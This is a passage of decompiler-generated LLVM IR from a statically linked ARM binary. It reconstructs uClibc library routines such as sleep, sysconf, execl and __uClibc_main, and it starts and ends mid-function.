  %v4_17468 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 92) to i32*), align 4
  store i32 %v4_17468, i32* @r4, align 4
  %v2_17470 = ptrtoint i32* %stack_var_-16 to i32
  store i32 %arg1, i32* @r6, align 4
  %v4_17488 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 76) to i32*), align 4
  call void @__pseudo_branch(i32 %v4_17488)
  %v0_1749c = load i32, i32* @r5, align 4
  %v2_1749c = add i32 %v0_1749c, 16
  %v3_1749c = inttoptr i32 %v2_1749c to i32*
  %v4_1749c = load i32, i32* %v3_1749c, align 4
  call void @__pseudo_branch(i32 %v4_1749c)
  %v0_174ac = load i32, i32* @r5, align 4
  %v2_174ac = add i32 %v0_174ac, 26428
  %v3_174ac = inttoptr i32 %v2_174ac to i32*
  %v4_174ac = load i32, i32* %v3_174ac, align 4
  %v2_174b0 = icmp eq i32 %v4_174ac, 0
  br i1 %v2_174b0, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v2_174bc = xor i1 %v2_174b0, true
  call void @__pseudo_cond_branch(i1 %v2_174bc, i32 %v4_174ac)
  store i32 %v2_17470, i32* @r0, align 4
  %v0_174cc = load i32, i32* @r5, align 4
  %v2_174cc = add i32 %v0_174cc, 24
  %v3_174cc = inttoptr i32 %v2_174cc to i32*
  %v4_174cc = load i32, i32* %v3_174cc, align 4
  call void @__pseudo_branch(i32 %v4_174cc)
  %v0_174d8 = call i32 @__GI___uClibc_fini()
  %v0_174e0 = load i32, i32* @r5, align 4
  %v2_174e0 = add i32 %v0_174e0, -90336
  %v9_174e0 = icmp eq i32 %v2_174e0, 0
  br i1 %v9_174e0, label %bb9, label %bb8

bb8:                                              ; preds = %.thread
  br label %bb9

bb9:                                              ; preds = %.thread, %bb8
  %v2_174e8 = xor i1 %v9_174e0, true
  call void @__pseudo_cond_branch(i1 %v2_174e8, i32 %v2_174e0)
  %v0_174ec = load i32, i32* @r6, align 4
  %v1_174f0 = call i32 @__GI__exit(i32 %v0_174ec)
  %v0_174f4 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_174f4, label %bb10, label %.thread6

bb10:                                             ; preds = %bb9
  %v1_174f4 = load i32, i32* @r1, align 4
  %v8_174f4 = shl i32 %v1_174f0, %v1_174f0
  %v9_174f4 = and i32 %v1_174f4, %v8_174f4
  store i32 %v9_174f4, i32* @r2, align 4
  store i32 0, i32* @r6, align 4
  br label %.thread6

.thread6:                                         ; preds = %bb9, %bb10
  %v10_1750c = phi i32 [ %v1_174f0, %bb9 ], [ 0, %bb10 ]
  ret i32 %v10_1750c

; uselistorder directives
  uselistorder i32 %v1_174f0, { 0, 2, 1 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb9, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @sleep(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %stack_var_-24 = alloca i32, align 4
  %stack_var_-44 = alloca i32, align 4
  %v3_17514 = load i32, i32* @r4, align 4
  %v6_17514 = load i32, i32* @lr, align 4
  store i32 %arg1, i32* @ip, align 4
  %v2_17518 = icmp eq i32 %arg1, 0
  store i32 0, i32* @r4, align 4
  br i1 %v2_17518, label %dec_label_pc_175ac, label %dec_label_pc_17528

dec_label_pc_17528:                               ; preds = %entry
  %v2_17538 = ptrtoint i32* %stack_var_-44 to i32
  store i32 65536, i32* %stack_var_-24, align 4
  store i32 %arg1, i32* %stack_var_-16, align 4
  %v3_1754c = call i32 @__libc_sigaction(i32 17, i32 0, i32 %v2_17538)
  %v3_17550 = load i32, i32* %stack_var_-44, align 4
  %v7_17554 = icmp eq i32 %v3_17550, 1
  br i1 %v7_17554, label %bb, label %.thread2

bb:                                               ; preds = %dec_label_pc_17528
  br label %.thread2

.thread2:                                         ; preds = %dec_label_pc_17528, %bb
  call void @__pseudo_cond_branch(i1 %v7_17554, i32 ptrtoint (i32* @global_var_12c5c.1031 to i32))
  %v2_17568 = ptrtoint i32* %stack_var_-16 to i32
  %v2_17570 = call i32 @__libc_nanosleep(i32 %v2_17568, i32 %v2_17568)
  %v2_17574 = icmp eq i32 %v2_17570, 0
  br i1 %v2_17574, label %bb19, label %bb18

bb18:                                             ; preds = %.thread2
  %v3_17588 = load i32, i32* %stack_var_-16, align 4
  br label %bb19

bb19:                                             ; preds = %.thread2, %bb18
  %storemerge = phi i32 [ %v3_17588, %bb18 ], [ 0, %.thread2 ]
  store i32 %storemerge, i32* %r4.global-to-local, align 4
  %v3_17598 = load i32, i32* %stack_var_-24, align 4
  %v1_1759c = and i32 %v3_17598, 65536
  %v2_1759c = icmp eq i32 %v1_1759c, 0
  br i1 %v2_1759c, label %bb20, label %.thread6

bb20:                                             ; preds = %bb19
  br label %.thread6

.thread6:                                         ; preds = %bb19, %bb20
  call void @__pseudo_cond_branch(i1 %v2_1759c, i32 ptrtoint (i32* @global_var_12c5c.1031 to i32))
  %v0_175ac.pre = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_175ac

dec_label_pc_175ac:                               ; preds = %entry, %.thread6
  %v0_175ac = phi i32 [ %v0_175ac.pre, %.thread6 ], [ 0, %entry ]
  store i32 %v3_17514, i32* @r4, align 4
  store i32 %v6_17514, i32* @lr, align 4
  ret i32 %v0_175ac

; uselistorder directives
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @__libc_sigaction, { 1, 0, 2 }
  uselistorder label %dec_label_pc_175ac, { 1, 0 }
  uselistorder label %.thread6, { 1, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %.thread2, { 1, 0 }
}

define i32 @nprocessors_onln() local_unnamed_addr {
entry:
  %stack_var_-36 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r4, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33944), i32* @r0, align 4
  store i32 0, i32* @r5, align 4
  store i32 0, i32* %stack_var_-36, align 4
  %v1_175e0 = call i32 @__GI_config_open(i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33944))
  store i32 %v1_175e0, i32* @r6, align 4
  %v2_175e4 = icmp eq i32 %v1_175e0, 0
  br i1 %v2_175e4, label %dec_label_pc_17664, label %dec_label_pc_175ec

dec_label_pc_175ec:                               ; preds = %entry
  store i32 684, i32* @sl, align 4
  %v0_175f4 = load i32, i32* @r4, align 4
  %v2_175f4 = add i32 %v0_175f4, -33932
  store i32 %v2_175f4, i32* @r8, align 4
  %v2_175f8 = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_175f8, i32* @r7, align 4
  br label %bb18

dec_label_pc_17600:                               ; preds = %bb18
  %v3_17600 = load i32, i32* %stack_var_-36, align 4
  %v1_17604 = inttoptr i32 %v3_17600 to i32*
  %v2_17604 = load i32, i32* %v1_17604, align 4
  %v1_17608 = inttoptr i32 %v2_17604 to i8*
  %v2_17608 = load i8, i8* %v1_17608, align 1
  %v7_1760c = icmp eq i8 %v2_17608, 99
  br i1 %v7_1760c, label %dec_label_pc_17614, label %.backedge3

dec_label_pc_17614:                               ; preds = %dec_label_pc_17600
  %v1_17614 = add i32 %v2_17604, 1
  %v2_17614 = inttoptr i32 %v1_17614 to i8*
  %v3_17614 = load i8, i8* %v2_17614, align 1
  %v7_17618 = icmp eq i8 %v3_17614, 112
  br i1 %v7_17618, label %dec_label_pc_17620, label %.backedge3

dec_label_pc_17620:                               ; preds = %dec_label_pc_17614
  %v1_17620 = add i32 %v2_17604, 2
  %v2_17620 = inttoptr i32 %v1_17620 to i8*
  %v3_17620 = load i8, i8* %v2_17620, align 1
  %v7_17624 = icmp eq i8 %v3_17620, 117
  br i1 %v7_17624, label %dec_label_pc_1762c, label %.backedge3

dec_label_pc_1762c:                               ; preds = %dec_label_pc_17620
  %v1_1762c = add i32 %v2_17604, 3
  %v2_1762c = inttoptr i32 %v1_1762c to i8*
  %v3_1762c = load i8, i8* %v2_1762c, align 1
  %v4_1762c = zext i8 %v3_1762c to i32
  %v0_17630 = load i32, i32* @r4, align 4
  %v1_17630 = load i32, i32* @sl, align 4
  %v2_17630 = add i32 %v1_17630, %v0_17630
  %v3_17630 = inttoptr i32 %v2_17630 to i32*
  %v4_17630 = load i32, i32* %v3_17630, align 4
  %v2_17634 = mul nuw nsw i32 %v4_1762c, 2
  %v2_17638 = add i32 %v4_17630, %v2_17634
  %v3_17638 = inttoptr i32 %v2_17638 to i16*
  %v4_17638 = load i16, i16* %v3_17638, align 2
  %v1_1763c = and i16 %v4_17638, 8
  %v2_1763c = icmp eq i16 %v1_1763c, 0
  br i1 %v2_1763c, label %.backedge3, label %bb

bb:                                               ; preds = %dec_label_pc_1762c
  %v1_17640 = load i32, i32* @r5, align 4
  %v2_17640 = add i32 %v1_17640, 1
  store i32 %v2_17640, i32* @r5, align 4
  br label %.backedge3

.backedge3:                                       ; preds = %bb, %dec_label_pc_1762c, %dec_label_pc_17600, %dec_label_pc_17614, %dec_label_pc_17620
  %v0_17644.pre = load i32, i32* @r6, align 4
  %v0_17650.pre = load i32, i32* @r8, align 4
  br label %bb18

bb18:                                             ; preds = %.backedge3, %dec_label_pc_175ec
  %v0_17650 = phi i32 [ %v0_17650.pre, %.backedge3 ], [ %v2_175f4, %dec_label_pc_175ec ]
  %v0_17644 = phi i32 [ %v0_17644.pre, %.backedge3 ], [ %v1_175e0, %dec_label_pc_175ec ]
  %v4_17654 = inttoptr i32 %v0_17644 to i32*
  %v5_17654 = call i32 @__GI_config_read(i32* %v4_17654, i32 %v2_175f8, i32 258, i32 %v0_17650)
  %v2_17658 = icmp eq i32 %v5_17654, 0
  br i1 %v2_17658, label %dec_label_pc_176c8, label %dec_label_pc_17600

dec_label_pc_17664:                               ; preds = %entry
  %v0_17668 = load i32, i32* @r4, align 4
  %v2_17668 = add i32 %v0_17668, -33928
  store i32 %v2_17668, i32* @r0, align 4
  %v1_1766c = call i32 @__GI_config_open(i32 %v2_17668)
  store i32 %v1_1766c, i32* @r6, align 4
  %v2_17670 = icmp eq i32 %v1_1766c, 0
  br i1 %v2_17670, label %bb19, label %dec_label_pc_1767c

bb19:                                             ; preds = %dec_label_pc_17664
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_176c8

dec_label_pc_1767c:                               ; preds = %dec_label_pc_17664
  %v0_17680 = load i32, i32* @r4, align 4
  %v2_17680 = add i32 %v0_17680, -33912
  store i32 %v2_17680, i32* @r8, align 4
  %v2_17688 = add i32 %v0_17680, -33876
  store i32 %v2_17688, i32* @r7, align 4
  %v2_1768c = ptrtoint i32* %stack_var_-36 to i32
  store i32 %v2_1768c, i32* @r4, align 4
  br label %bb21

dec_label_pc_17694:                               ; preds = %bb21
  %v0_176c0 = load i32, i32* @r8, align 4
  %v3_17694 = load i32, i32* %stack_var_-36, align 4
  %v1_17698 = inttoptr i32 %v3_17694 to i32*
  %v2_17698 = load i32, i32* %v1_17698, align 4
  store i32 %v2_17698, i32* @r1, align 4
  %v2_1769c = inttoptr i32 %v0_176c0 to i8*
  %v3_1769c = call i32 @__GI_strcoll(i8* %v2_1769c, i32 %v2_17698)
  %v2_176a0 = icmp eq i32 %v3_1769c, 0
  br i1 %v2_176a0, label %bb20, label %.backedge

bb20:                                             ; preds = %dec_label_pc_17694
  %v1_176a4 = load i32, i32* @r5, align 4
  %v2_176a4 = add i32 %v1_176a4, 1
  store i32 %v2_176a4, i32* @r5, align 4
  br label %.backedge

.backedge:                                        ; preds = %bb20, %dec_label_pc_17694
  %v0_176b0.pre = load i32, i32* @r7, align 4
  %v0_176b4.pre = load i32, i32* @r6, align 4
  br label %bb21

bb21:                                             ; preds = %.backedge, %dec_label_pc_1767c
  %v0_176b4 = phi i32 [ %v0_176b4.pre, %.backedge ], [ %v1_1766c, %dec_label_pc_1767c ]
  %v0_176b0 = phi i32 [ %v0_176b0.pre, %.backedge ], [ %v2_17688, %dec_label_pc_1767c ]
  %v4_176b8 = inttoptr i32 %v0_176b4 to i32*
  %v5_176b8 = call i32 @__GI_config_read(i32* %v4_176b8, i32 %v2_1768c, i32 459266, i32 %v0_176b0)
  %v2_176bc = icmp eq i32 %v5_176b8, 0
  br i1 %v2_176bc, label %dec_label_pc_176c8, label %dec_label_pc_17694

dec_label_pc_176c8:                               ; preds = %bb18, %bb21, %bb19
  %v0_176c8 = load i32, i32* @r6, align 4
  %v1_176cc = inttoptr i32 %v0_176c8 to i32*
  %v2_176cc = call i32 @__GI_config_close(i32* %v1_176cc)
  %v0_176d0 = load i32, i32* @r5, align 4
  %v2_176d0 = icmp eq i32 %v0_176d0, 0
  %.v0_176d0 = select i1 %v2_176d0, i32 1, i32 %v0_176d0
  ret i32 %.v0_176d0

; uselistorder directives
  uselistorder i32* %stack_var_-36, { 0, 3, 1, 4, 2 }
  uselistorder label %dec_label_pc_176c8, { 1, 2, 0 }
  uselistorder label %.backedge3, { 0, 1, 4, 3, 2 }
}

define i32 @sysconf(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %tmp = icmp ult i32 %arg1, 241
  br i1 %tmp, label %bb, label %dec_label_pc_17af4

bb:                                               ; preds = %entry
  %v7_17720 = mul i32 %arg1, 4
  %v8_17720 = add i32 %v7_17720, ptrtoint (i32* @global_var_17728.1043 to i32)
  call void @__pseudo_branch(i32 %v8_17720)
  br label %dec_label_pc_17af4

dec_label_pc_17af4:                               ; preds = %bb, %entry
  %v0_17af4 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_17b00 = inttoptr i32 %v0_17af4 to i32*
  store i32 22, i32* %v2_17b00, align 4
  %v0_17cb0 = load i32, i32* %r2.global-to-local, align 4
  ret i32 %v0_17cb0

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @execl(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-8 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_0 = alloca i32, align 4
  %v1_17ce4 = ptrtoint i32* %stack_var_0 to i32
  store i32 %v1_17ce4, i32* %ip.global-to-local, align 4
  store i32 %arg3, i32* %stack_var_-8, align 4
  %v2_17cf8 = ptrtoint i32* %stack_var_-40 to i32
  %v2_17cfc = ptrtoint i32* %stack_var_-8 to i32
  br label %dec_label_pc_17d0c

dec_label_pc_17d0c:                               ; preds = %dec_label_pc_17d0c, %entry
  %v0_17d20 = phi i32 [ 0, %entry ], [ %v1_17d20, %dec_label_pc_17d0c ]
  %stack_var_-36.0 = phi i32 [ %v2_17cfc, %entry ], [ %v1_17d14, %dec_label_pc_17d0c ]
  %v1_17d10 = inttoptr i32 %stack_var_-36.0 to i32*
  %v2_17d10 = load i32, i32* %v1_17d10, align 4
  %v1_17d14 = add i32 %stack_var_-36.0, 4
  %v2_17d18 = icmp eq i32 %v2_17d10, 0
  %v1_17d20 = add i32 %v0_17d20, 1
  store i32 %v1_17d20, i32* @lr, align 4
  br i1 %v2_17d18, label %dec_label_pc_17d28, label %dec_label_pc_17d0c

dec_label_pc_17d28:                               ; preds = %dec_label_pc_17d0c
  %v3_17d28 = mul i32 %v1_17d20, 4
  %v1_17d2c = add i32 %v3_17d28, 18
  %v1_17d30 = and i32 %v1_17d2c, -8
  %v2_17d34 = sub i32 %v2_17cf8, %v1_17d30
  %v2_17d3c = inttoptr i32 %v2_17d34 to i32*
  store i32 %arg2, i32* %v2_17d3c, align 4
  %v0_17d48 = load i32, i32* @sp, align 4
  store i32 %v0_17d48, i32* %ip.global-to-local, align 4
  br label %dec_label_pc_17d50

dec_label_pc_17d50:                               ; preds = %dec_label_pc_17d50, %dec_label_pc_17d28
  %v1_17d64 = phi i32 [ %v0_17d48, %dec_label_pc_17d28 ], [ %v5_17d64, %dec_label_pc_17d50 ]
  %stack_var_-36.1 = phi i32 [ %v2_17cfc, %dec_label_pc_17d28 ], [ %v1_17d5c, %dec_label_pc_17d50 ]
  %v1_17d54 = inttoptr i32 %stack_var_-36.1 to i32*
  %v2_17d54 = load i32, i32* %v1_17d54, align 4
  %v0_17d58 = load i32, i32* @lr, align 4
  %v1_17d58 = add i32 %v0_17d58, -1
  store i32 %v1_17d58, i32* @lr, align 4
  %v7_17d58 = icmp eq i32 %v0_17d58, 1
  %v1_17d5c = add i32 %stack_var_-36.1, 4
  %v2_17d64 = add i32 %v1_17d64, 4
  %v3_17d64 = inttoptr i32 %v2_17d64 to i32*
  store i32 %v2_17d54, i32* %v3_17d64, align 4
  %v4_17d64 = load i32, i32* %ip.global-to-local, align 4
  %v5_17d64 = add i32 %v4_17d64, 4
  store i32 %v5_17d64, i32* %ip.global-to-local, align 4
  br i1 %v7_17d58, label %dec_label_pc_17d6c, label %dec_label_pc_17d50

dec_label_pc_17d6c:                               ; preds = %dec_label_pc_17d50
  %v0_17d78 = call i32 @__GI_execve()
  ret i32 %v0_17d78

; uselistorder directives
  uselistorder i32 %v5_17d64, { 1, 0 }
  uselistorder i32 %v0_17d58, { 1, 0 }
  uselistorder i32 %v1_17d20, { 0, 2, 1 }
  uselistorder i32 %stack_var_-36.0, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @usleep(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-24 = alloca i32, align 4
  %v2_17d98 = ptrtoint i32* %stack_var_-24 to i32
  %v2_17da4 = udiv i32 %arg1, 1000000
  store i32 %v2_17da4, i32* %stack_var_-24, align 4
  %v2_17dcc = call i32 @__libc_nanosleep(i32 %v2_17d98, i32 0)
  ret i32 %v2_17dcc
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_17df0 = add i32 %tmp, 4
  %v4_17df0 = inttoptr i32 %v3_17df0 to i32*
  store i32 %arg3, i32* %v4_17df0, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_17dfc = icmp eq i32 %arg2, 0
  br i1 %v2_17dfc, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_17e08 = add i32 %tmp, 4
  %v3_17e08 = inttoptr i32 %v2_17e08 to i32*
  %v4_17e08 = load i32, i32* %v3_17e08, align 4
  store i32 %v4_17e08, i32* %r0.global-to-local, align 4
  %v3_17e0c = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_17e0c, %bb ], [ undef, %entry ]
  %v2_17e14 = xor i1 %v2_17dfc, true
  call void @__pseudo_cond_branch(i1 %v2_17e14, i32 %.02)
  %v1_17e20 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_17e20

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_17e48.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_17e24 = load i32, i32* @r4, align 4
  store i32 %v3_17e24, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_17e48

dec_label_pc_17e48:                               ; preds = %dec_label_pc_17e48.dec_label_pc_17e48_crit_edge, %dec_label_pc_17e48.lr.ph
  %v1_17e48 = phi i32 [ %v1_17e54, %dec_label_pc_17e48.dec_label_pc_17e48_crit_edge ], [ 0, %dec_label_pc_17e48.lr.ph ]
  %v0_17e48 = phi i32 [ %v0_17e48.pre, %dec_label_pc_17e48.dec_label_pc_17e48_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -8), %dec_label_pc_17e48.lr.ph ]
  %v4_17e48 = mul i32 %v1_17e48, 4
  %v5_17e48 = add i32 %v4_17e48, %v0_17e48
  %v6_17e48 = inttoptr i32 %v5_17e48 to i32*
  %v7_17e48 = load i32, i32* %v6_17e48, align 4
  call void @__pseudo_branch(i32 %v7_17e48)
  %v0_17e54 = load i32, i32* %r4.global-to-local, align 4
  %v1_17e54 = add i32 %v0_17e54, -1
  store i32 %v1_17e54, i32* %r4.global-to-local, align 4
  %v2_17e54 = icmp eq i32 %v0_17e54, 0
  br i1 %v2_17e54, label %dec_label_pc_17e5c, label %dec_label_pc_17e48.dec_label_pc_17e48_crit_edge

dec_label_pc_17e48.dec_label_pc_17e48_crit_edge:  ; preds = %dec_label_pc_17e48
  %v0_17e48.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_17e48

dec_label_pc_17e5c:                               ; preds = %dec_label_pc_17e48
  %v0_17e60.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_17e60 = add i32 %v0_17e60.pre, 26444
  %v3_17e60 = inttoptr i32 %v2_17e60 to i32*
  %v4_17e60 = load i32, i32* %v3_17e60, align 4
  %v2_17e64 = icmp eq i32 %v4_17e60, 0
  br i1 %v2_17e64, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_17e5c
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_17e5c, %bb
  %v2_17e6c = xor i1 %v2_17e64, true
  call void @__pseudo_cond_branch(i1 %v2_17e6c, i32 %v4_17e60)
  %v0_17e74 = load i32, i32* %r5.global-to-local, align 4
  %v2_17e74 = add i32 %v0_17e74, 26448
  %v3_17e74 = inttoptr i32 %v2_17e74 to i32*
  %v4_17e74 = load i32, i32* %v3_17e74, align 4
  %v2_17e78 = icmp eq i32 %v4_17e74, 0
  br i1 %v2_17e78, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_17e80 = xor i1 %v2_17e78, true
  call void @__pseudo_cond_branch(i1 %v2_17e80, i32 %v4_17e74)
  %v2_17e84 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_17e84, i32* %r4.global-to-local, align 4
  %v1_17e88 = load i32, i32* @r0, align 4
  ret i32 %v1_17e88

; uselistorder directives
  uselistorder i32 %v1_17e54, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %v2_17eb4 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_17ebc = icmp eq i32 %v2_17eb4, -1
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r3, align 4
  br i1 %v3_17ebc, label %dec_label_pc_17ec8, label %dec_label_pc_17ee0

dec_label_pc_17ec8:                               ; preds = %entry
  %v0_17ecc = load i32, i32* %r5.global-to-local, align 4
  %v2_17ed4 = call i32 @__GI_open(i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 -33872), i32 %v0_17ecc)
  %v1_17ed8 = load i32, i32* %r4.global-to-local, align 4
  %v1_17edc = icmp ne i32 %v2_17ed4, %v1_17ed8
  call void @__pseudo_cond_branch(i1 %v1_17edc, i32 ptrtoint (i32* @global_var_16b30.1063 to i32))
  br label %dec_label_pc_17ee0

dec_label_pc_17ee0:                               ; preds = %entry, %dec_label_pc_17ec8
  %v1_17ee8 = phi i32 [ %v2_17eb4, %entry ], [ %v2_17ed4, %dec_label_pc_17ec8 ]
  ret i32 %v1_17ee8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_open, { 0, 3, 4, 2, 1 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_17ee0, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* %r4.global-to-local, align 4
  %v4_17f04 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 96) to i32*), align 4
  %v1_17f08 = inttoptr i32 %v4_17f04 to i32*
  %v2_17f08 = load i32, i32* %v1_17f08, align 4
  %v2_17f0c = icmp eq i32 %v2_17f08, 0
  br i1 %v2_17f0c, label %dec_label_pc_17f14, label %dec_label_pc_17f48

dec_label_pc_17f14:                               ; preds = %entry
  %v4_17f18 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 56) to i32*), align 4
  %v2_17f20 = icmp eq i32 %v4_17f18, 0
  store i32 4096, i32* %v1_17f08, align 4
  br i1 %v2_17f20, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_17f14
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_17f14, %bb
  %v2_17f2c = xor i1 %v2_17f20, true
  call void @__pseudo_cond_branch(i1 %v2_17f2c, i32 %v4_17f18)
  %v0_17f34 = load i32, i32* %r4.global-to-local, align 4
  %v2_17f34 = add i32 %v0_17f34, -90492
  %v2_17f3c = icmp eq i32 %v2_17f34, 0
  br i1 %v2_17f3c, label %bb6, label %bb5

bb5:                                              ; preds = %bb4
  br label %bb6

bb6:                                              ; preds = %bb4, %bb5
  %v2_17f44 = xor i1 %v2_17f3c, true
  call void @__pseudo_cond_branch(i1 %v2_17f44, i32 %v2_17f34)
  br label %dec_label_pc_17f48

dec_label_pc_17f48:                               ; preds = %entry, %bb6
  %v1_17f4c = load i32, i32* @r0, align 4
  ret i32 %v1_17f4c

; uselistorder directives
  uselistorder label %dec_label_pc_17f48, { 1, 0 }
  uselistorder label %bb6, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %tmp50 = call i32 @__decompiler_undefined_function_0()
  %tmp51 = call i32 @__decompiler_undefined_function_0()
  %tmp52 = call i32 @__decompiler_undefined_function_0()
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp54 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  store i32 %tmp, i32* @r7, align 4
  %v1_17f68 = add i32 %tmp, 4
  store i32 %v1_17f68, i32* %ip.global-to-local, align 4
  %v2_17f6c = load i32, i32* %arg3, align 4
  store i32 20, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32* @r6, align 4
  %v3_17f78 = mul i32 %arg2, 4
  store i32 %v3_17f78, i32* %r5.global-to-local, align 4
  store i32 %arg2, i32* %sb.global-to-local, align 4
  %v4_17f80 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 20) to i32*), align 4
  store i32 %v4_17f80, i32* %r1.global-to-local, align 4
  store i32 28, i32* %r2.global-to-local, align 4
  %v2_17f88 = ptrtoint i32* %stack_var_-120 to i32
  %v4_17f8c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2947c.811 to i32), i32 28) to i32*), align 4
  store i32 %v4_17f8c, i32* %r4.global-to-local, align 4
  %v2_17f94 = add i32 %v1_17f68, %v3_17f78
  store i32 %v2_17f94, i32* %ip.global-to-local, align 4
  %v9_17f98 = icmp eq i32 %v2_17f94, %v2_17f6c
  store i1 %v9_17f98, i1* %cpsr_z.global-to-local, align 1
  %v2_17f9c = inttoptr i32 %v4_17f80 to i32*
  store i32 %arg7, i32* %v2_17f9c, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 26448, i32* %r2.global-to-local, align 4
  %v0_17fa8 = load i32, i32* %r3.global-to-local, align 4
  br i1 %v9_17f98, label %bb, label %.critedge

bb:                                               ; preds = %entry
  %v1_17fac = load i32, i32* @r7, align 4
  %v2_17fac = load i32, i32* %r5.global-to-local, align 4
